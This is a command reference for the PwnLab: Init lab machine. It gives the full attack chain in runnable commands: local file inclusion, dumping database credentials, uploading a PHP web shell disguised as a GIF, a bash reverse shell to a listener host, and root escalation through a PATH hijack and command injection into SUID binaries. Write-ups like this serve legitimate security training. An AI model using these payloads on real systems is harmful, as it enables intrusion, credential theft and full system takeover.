# PwnLab: Init — Command Reference

> All commands run from Kali. `$IP` = target (lab: `192.168.2.11`). Educational, isolated lab only.

## Recon
```bash
IP=192.168.2.11
nmap -sn 192.168.2.0/24
nmap -Pn -sV -p- $IP
```

## Web enumeration
```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

## LFI — read source via php://filter
```bash
curl -s "http://$IP/?page=php://filter/convert.base64-encode/resource=config" | base64 -d
curl -s "http://$IP/?page=php://filter/convert.base64-encode/resource=index"  | base64 -d
curl -s "http://$IP/?page=php://filter/convert.base64-encode/resource=login"  | base64 -d
curl -s "http://$IP/?page=php://filter/convert.base64-encode/resource=upload" | base64 -d
```

## Database — recover web credentials
```bash
mysql --skip-ssl -h $IP -u root -pH4u%QJ_H99 -e "use Users; select user,pass from users;"
# passwords are base64-encoded (not hashed) -> base64 -d each value
```

## Foothold — polyglot upload + lang-cookie include (RCE)
```bash
printf 'GIF89a;\n<?php system($_GET["c"]); ?>\n' > shell.gif
curl -s -c cj.txt -L -d "user=kent&pass=JWzXuBJJNy&submit=Login" "http://$IP/?page=login" >/dev/null
curl -s -b cj.txt -F "file=@shell.gif;type=image/gif" -F "submit=Upload" "http://$IP/?page=upload"

MD5=$(printf '%s' 'shell.gif' | md5sum | cut -d' ' -f1)
curl -s -b "lang=../upload/$MD5.gif" "http://$IP/index.php?c=id"        # -> www-data

# reverse shell (listener: nc -lvnp 4444)
curl -s -G -b "lang=../upload/$MD5.gif" "http://$IP/index.php" \
  --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/192.168.2.5/4444 0>&1'"
```

## Privilege escalation
```bash
# www-data -> kane (password reuse)
su kane                     # iSv5Ym2GRo

# kane -> mike (SUID msgmike calls 'cat' by relative path -> PATH hijack)
cd /tmp; echo '/bin/bash' > cat; chmod +x cat; export PATH=/tmp:$PATH
/home/kane/msgmike

# mike -> root (SUID-root msg2root passes input to system() -> command injection)
echo 'x; cat /root/flag.txt; id' | /home/mike/msg2root

# stable root shell
echo 'x; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' | /home/mike/msg2root
/tmp/rootbash -p
```
